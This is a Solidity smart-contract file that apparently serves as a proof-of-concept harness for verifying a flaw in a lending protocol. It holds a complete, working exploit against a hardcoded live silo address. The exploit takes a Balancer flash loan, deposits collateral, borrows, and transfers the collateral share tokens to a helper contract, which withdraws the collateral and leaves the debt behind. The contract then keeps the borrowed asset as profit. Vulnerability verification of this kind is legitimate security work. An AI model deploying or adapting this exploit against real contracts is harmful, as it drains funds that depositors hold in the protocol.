// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.13;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IShareToken is IERC20 {}

interface IPriceProvidersRepositoryLike {
    function getPrice(address asset) external view returns (uint256);
}

interface ISiloRepositoryLike {
    function getMaximumLTV(address silo, address asset) external view returns (uint256);
    function priceProvidersRepository() external view returns (IPriceProvidersRepositoryLike);
    function entryFee() external view returns (uint256);
}

interface ISiloLike {
    struct AssetStorage {
        IShareToken collateralToken;
        IShareToken collateralOnlyToken;
        IShareToken debtToken;
        uint256 totalDeposits;
        uint256 collateralOnlyDeposits;
        uint256 totalBorrowAmount;
    }

    function initAssetsTokens() external;
    function getAssets() external view returns (address[] memory assets);
    function assetStorage(address asset) external view returns (AssetStorage memory);
    function deposit(address asset, uint256 amount, bool collateralOnly)
        external
        returns (uint256 collateralAmount, uint256 collateralShare);
    function borrow(address asset, uint256 amount) external returns (uint256 debtAmount, uint256 debtShare);
    function withdraw(address asset, uint256 amount, bool collateralOnly)
        external
        returns (uint256 withdrawnAmount, uint256 withdrawnShare);
    function liquidity(address asset) external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

contract WithdrawalHelper {
    address public immutable verifier;

    constructor(address verifier_) {
        verifier = verifier_;
    }

    modifier onlyVerifier() {
        require(msg.sender == verifier, "only verifier");
        _;
    }

    function executeWithdraw(address silo, address asset) external onlyVerifier returns (uint256 withdrawnAmount) {
        (withdrawnAmount,) = ISiloLike(silo).withdraw(asset, type(uint256).max, false);
        _safeTransfer(asset, verifier, IERC20(asset).balanceOf(address(this)));
    }

    function shareBalance(address shareToken) external view returns (uint256) {
        return IERC20(shareToken).balanceOf(address(this));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        if (amount == 0) return;
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

contract FlawVerifier is IFlashLoanRecipient {
    address public constant TARGET_SILO = 0xcB3B879aB11F825885d5aDD8Bf3672596d35197C;
    address public constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    uint256 internal constant ONE = 1e18;
    uint256 internal constant SAFETY_BPS = 9_000;
    uint256 internal constant BPS = 10_000;
    uint256 internal constant TARGET_COLLATERAL_VALUE = 50 ether;

    enum Outcome {
        Unset,
        Profit,
        RefutedTransferStage,
        InfeasibleNoFunding,
        InfeasibleNoBorrowPair
    }

    WithdrawalHelper public immutable helper;

    address internal _profitToken;
    uint256 internal _profitAmount;

    Outcome public outcome;
    address public chosenCollateralAsset;
    address public chosenBorrowAsset;
    bytes32 public lastFailureTag;

    struct FlashContext {
        address collateralAsset;
        address borrowAsset;
        uint256 initialBorrowBalance;
        bool active;
    }

    FlashContext internal flashContext;

    error TransferStageFailed();
    error WithdrawStageFailed();

    modifier onlySelf() {
        require(msg.sender == address(this), "only self");
        _;
    }

    constructor() {
        helper = new WithdrawalHelper(address(this));
    }

    function executeOnOpportunity() external {
        if (_profitAmount != 0) return;

        _bestEffortInitAssets();

        if (_attemptUsingOwnedBalances()) {
            return;
        }

        if (_attemptUsingBalancerFlashLoan()) {
            return;
        }

        if (outcome == Outcome.Unset) {
            if (lastFailureTag == bytes32(0)) {
                outcome = Outcome.InfeasibleNoFunding;
                lastFailureTag = keccak256("NO_STARTING_BALANCE_OR_FLASH_PAIR");
            } else {
                outcome = Outcome.InfeasibleNoBorrowPair;
            }
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return outcome == Outcome.Profit;
    }

    function hypothesisRefuted() external view returns (bool) {
        return outcome == Outcome.RefutedTransferStage;
    }

    function attemptDirectPair(address collateralAsset, address borrowAsset, uint256 depositAmount)
        external
        onlySelf
        returns (uint256)
    {
        uint256 initialBorrowBalance = IERC20(borrowAsset).balanceOf(address(this));

        _forceApprove(collateralAsset, TARGET_SILO, depositAmount);
        (, uint256 collateralShare) = ISiloLike(TARGET_SILO).deposit(collateralAsset, depositAmount, false);
        require(collateralShare != 0, "zero shares");

        uint256 borrowAmount = _quoteBorrowAmount(collateralAsset, borrowAsset, depositAmount);
        require(borrowAmount != 0, "zero borrow amount");

        ISiloLike(TARGET_SILO).borrow(borrowAsset, borrowAmount);

        // Path stage 3: Account A transfers its collateral share token position to account B.
        ISiloLike.AssetStorage memory state = ISiloLike(TARGET_SILO).assetStorage(collateralAsset);
        if (!_safeTransferERC20(address(state.collateralToken), address(helper), collateralShare)) {
            revert TransferStageFailed();
        }
        if (IERC20(address(state.collateralToken)).balanceOf(address(helper)) == 0) {
            revert TransferStageFailed();
        }

        // Path stage 4: Account B withdraws the transferred collateral.
        try helper.executeWithdraw(TARGET_SILO, collateralAsset) returns (uint256 withdrawnAmount) {
            withdrawnAmount;
        } catch {
            revert WithdrawStageFailed();
        }

        uint256 realizedProfit = IERC20(borrowAsset).balanceOf(address(this)) - initialBorrowBalance;
        require(realizedProfit != 0, "no profit");

        _profitToken = borrowAsset;
        _profitAmount = realizedProfit;
        chosenCollateralAsset = collateralAsset;
        chosenBorrowAsset = borrowAsset;
        outcome = Outcome.Profit;

        return realizedProfit;
    }

    function attemptFlashLoanPair(address collateralAsset, address borrowAsset, uint256 flashAmount)
        external
        onlySelf
        returns (bool)
    {
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(collateralAsset);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashAmount;

        flashContext = FlashContext({
            collateralAsset: collateralAsset,
            borrowAsset: borrowAsset,
            initialBorrowBalance: IERC20(borrowAsset).balanceOf(address(this)),
            active: true
        });

        // Temporary capital is only used to instantiate the same deposit/borrow/transfer/withdraw path.
        IBalancerVault(BALANCER_VAULT).flashLoan(this, tokens, amounts, bytes(""));
        require(!flashContext.active, "flash context not cleared");

        return _profitAmount != 0;
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == BALANCER_VAULT, "not vault");
        require(flashContext.active, "inactive flash");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "bad flash arrays");
        require(address(tokens[0]) == flashContext.collateralAsset, "unexpected token");

        address collateralAsset = flashContext.collateralAsset;
        address borrowAsset = flashContext.borrowAsset;
        uint256 flashAmount = amounts[0];

        _forceApprove(collateralAsset, TARGET_SILO, flashAmount);
        (, uint256 collateralShare) = ISiloLike(TARGET_SILO).deposit(collateralAsset, flashAmount, false);
        require(collateralShare != 0, "zero flash shares");

        uint256 borrowAmount = _quoteBorrowAmount(collateralAsset, borrowAsset, flashAmount);
        require(borrowAmount != 0, "zero flash borrow");

        ISiloLike(TARGET_SILO).borrow(borrowAsset, borrowAmount);

        // Path stage 3: the borrowed account separates collateral ownership with a raw share transfer.
        ISiloLike.AssetStorage memory state = ISiloLike(TARGET_SILO).assetStorage(collateralAsset);
        if (!_safeTransferERC20(address(state.collateralToken), address(helper), collateralShare)) {
            revert TransferStageFailed();
        }
        if (IERC20(address(state.collateralToken)).balanceOf(address(helper)) == 0) {
            revert TransferStageFailed();
        }

        // Path stage 4: the recipient account withdraws the detached collateral and returns it,
        // which is enough to repay the temporary flash capital while the borrowed asset remains.
        try helper.executeWithdraw(TARGET_SILO, collateralAsset) returns (uint256 withdrawnAmount) {
            withdrawnAmount;
        } catch {
            revert WithdrawStageFailed();
        }

        uint256 repayAmount = flashAmount + feeAmounts[0];
        _safeTransfer(collateralAsset, BALANCER_VAULT, repayAmount);

        uint256 realizedProfit = IERC20(borrowAsset).balanceOf(address(this)) - flashContext.initialBorrowBalance;
        require(realizedProfit != 0, "no flash profit");

        _profitToken = borrowAsset;
        _profitAmount = realizedProfit;
        chosenCollateralAsset = collateralAsset;
        chosenBorrowAsset = borrowAsset;
        outcome = Outcome.Profit;

        delete flashContext;
    }

    function _attemptUsingOwnedBalances() internal returns (bool) {
        address[] memory assets = ISiloLike(TARGET_SILO).getAssets();
        bool hadBalance;

        for (uint256 i = 0; i < assets.length; i++) {
            address collateralAsset = assets[i];
            uint256 balance = IERC20(collateralAsset).balanceOf(address(this));
            if (balance == 0) continue;
            hadBalance = true;

            for (uint256 j = 0; j < assets.length; j++) {
                address borrowAsset = assets[j];
                if (borrowAsset == collateralAsset) continue;

                uint256 quotedBorrow = _quoteBorrowAmount(collateralAsset, borrowAsset, balance);
                if (quotedBorrow == 0) continue;

                try this.attemptDirectPair(collateralAsset, borrowAsset, balance) returns (uint256 realizedProfit) {
                    if (realizedProfit != 0) return true;
                } catch (bytes memory reason) {
                    if (_isRefutingFailure(reason)) {
                        outcome = Outcome.RefutedTransferStage;
                        lastFailureTag = keccak256("DIRECT_SHARE_TRANSFER_OR_WITHDRAW_FAILED");
                    } else if (lastFailureTag == bytes32(0)) {
                        lastFailureTag = keccak256("DIRECT_RUNTIME_PRECONDITION_FAILED");
                    }
                }
            }
        }

        if (!hadBalance) {
            lastFailureTag = keccak256("NO_VERIFIER_HELD_COLLATERAL");
        }

        return false;
    }

    function _attemptUsingBalancerFlashLoan() internal returns (bool) {
        address[] memory assets = ISiloLike(TARGET_SILO).getAssets();
        bool hadFlashCandidate;

        for (uint256 i = 0; i < assets.length; i++) {
            address collateralAsset = assets[i];
            uint256 vaultBalance = IERC20(collateralAsset).balanceOf(BALANCER_VAULT);
            if (vaultBalance == 0) continue;

            uint256 flashAmount = _boundedFlashAmount(collateralAsset, vaultBalance);
            if (flashAmount == 0) continue;

            for (uint256 j = 0; j < assets.length; j++) {
                address borrowAsset = assets[j];
                if (borrowAsset == collateralAsset) continue;

                uint256 quotedBorrow = _quoteBorrowAmount(collateralAsset, borrowAsset, flashAmount);
                if (quotedBorrow == 0) continue;
                hadFlashCandidate = true;

                try this.attemptFlashLoanPair(collateralAsset, borrowAsset, flashAmount) returns (bool success) {
                    if (success) return true;
                } catch (bytes memory reason) {
                    if (_isRefutingFailure(reason)) {
                        outcome = Outcome.RefutedTransferStage;
                        lastFailureTag = keccak256("FLASH_SHARE_TRANSFER_OR_WITHDRAW_FAILED");
                    } else if (lastFailureTag == bytes32(0)) {
                        lastFailureTag = keccak256("FLASH_RUNTIME_PRECONDITION_FAILED");
                    }
                }
            }
        }

        if (!hadFlashCandidate) {
            lastFailureTag = keccak256("NO_FLASHLOAN_COMPATIBLE_PAIR");
        }

        return false;
    }

    function _quoteBorrowAmount(address collateralAsset, address borrowAsset, uint256 collateralAmount)
        internal
        view
        returns (uint256)
    {
        if (collateralAmount == 0) return 0;

        (bool okLtv, uint256 maxLTV) = _staticUint(
            address(_repository()),
            abi.encodeWithSelector(ISiloRepositoryLike.getMaximumLTV.selector, TARGET_SILO, collateralAsset)
        );
        if (!okLtv || maxLTV == 0) return 0;

        uint256 collateralValue = _valueOf(collateralAsset, collateralAmount);
        if (collateralValue == 0) return 0;

        uint256 rawDebtValue = collateralValue * maxLTV / ONE;
        uint256 feeAdjustedDebtValue = rawDebtValue * SAFETY_BPS / BPS;
        if (feeAdjustedDebtValue == 0) return 0;

        uint256 entryFee = _repository().entryFee();
        feeAdjustedDebtValue = feeAdjustedDebtValue * ONE / (ONE + entryFee);
        if (feeAdjustedDebtValue == 0) return 0;

        (bool okPrice, uint256 borrowPrice) = _staticUint(
            address(_priceRepo()),
            abi.encodeWithSelector(IPriceProvidersRepositoryLike.getPrice.selector, borrowAsset)
        );
        if (!okPrice || borrowPrice == 0) return 0;

        (bool okDecimals, uint256 borrowDecimals) = _staticUint(
            borrowAsset,
            abi.encodeWithSelector(IERC20.decimals.selector)
        );
        if (!okDecimals) return 0;

        uint256 borrowAmount = feeAdjustedDebtValue * (10 ** borrowDecimals) / borrowPrice;
        if (borrowAmount == 0) return 0;

        uint256 availableLiquidity = ISiloLike(TARGET_SILO).liquidity(borrowAsset);
        if (availableLiquidity == 0) return 0;

        if (borrowAmount > availableLiquidity) {
            borrowAmount = availableLiquidity * SAFETY_BPS / BPS;
        }

        return borrowAmount;
    }

    function _boundedFlashAmount(address collateralAsset, uint256 vaultBalance) internal view returns (uint256) {
        uint256 cappedByInventory = vaultBalance / 1_000;
        if (cappedByInventory == 0) return 0;

        (bool okPrice, uint256 price) = _staticUint(
            address(_priceRepo()),
            abi.encodeWithSelector(IPriceProvidersRepositoryLike.getPrice.selector, collateralAsset)
        );
        if (!okPrice || price == 0) return 0;

        (bool okDecimals, uint256 decimalsValue) = _staticUint(
            collateralAsset,
            abi.encodeWithSelector(IERC20.decimals.selector)
        );
        if (!okDecimals) return 0;

        uint256 targetByValue = TARGET_COLLATERAL_VALUE * (10 ** decimalsValue) / price;
        if (targetByValue == 0) targetByValue = 1;

        return targetByValue < cappedByInventory ? targetByValue : cappedByInventory;
    }

    function _valueOf(address asset, uint256 amount) internal view returns (uint256) {
        (bool okPrice, uint256 price) = _staticUint(
            address(_priceRepo()),
            abi.encodeWithSelector(IPriceProvidersRepositoryLike.getPrice.selector, asset)
        );
        if (!okPrice || price == 0) return 0;

        (bool okDecimals, uint256 decimalsValue) = _staticUint(
            asset,
            abi.encodeWithSelector(IERC20.decimals.selector)
        );
        if (!okDecimals) return 0;

        return amount * price / (10 ** decimalsValue);
    }

    function _repository() internal view returns (ISiloRepositoryLike) {
        return ISiloRepositoryLike(_staticAddress(
            TARGET_SILO,
            abi.encodeWithSignature("siloRepository()")
        ));
    }

    function _priceRepo() internal view returns (IPriceProvidersRepositoryLike) {
        return _repository().priceProvidersRepository();
    }

    function _bestEffortInitAssets() internal {
        try ISiloLike(TARGET_SILO).initAssetsTokens() {} catch {}
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        if (amount == 0) return;
        require(_safeTransferERC20(token, to, amount), "transfer failed");
    }

    function _safeTransferERC20(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _staticUint(address target, bytes memory callData) internal view returns (bool ok, uint256 value) {
        (ok, bytes memory ret) = target.staticcall(callData);
        if (!ok || ret.length < 32) return (false, 0);
        value = abi.decode(ret, (uint256));
    }

    function _staticAddress(address target, bytes memory callData) internal view returns (address value) {
        (bool ok, bytes memory ret) = target.staticcall(callData);
        require(ok && ret.length >= 32, "static address call failed");
        value = abi.decode(ret, (address));
    }

    function _isRefutingFailure(bytes memory reason) internal pure returns (bool) {
        if (reason.length < 4) return false;

        bytes4 selector;
        assembly {
            selector := mload(add(reason, 0x20))
        }

        return selector == TransferStageFailed.selector || selector == WithdrawStageFailed.selector;
    }
}
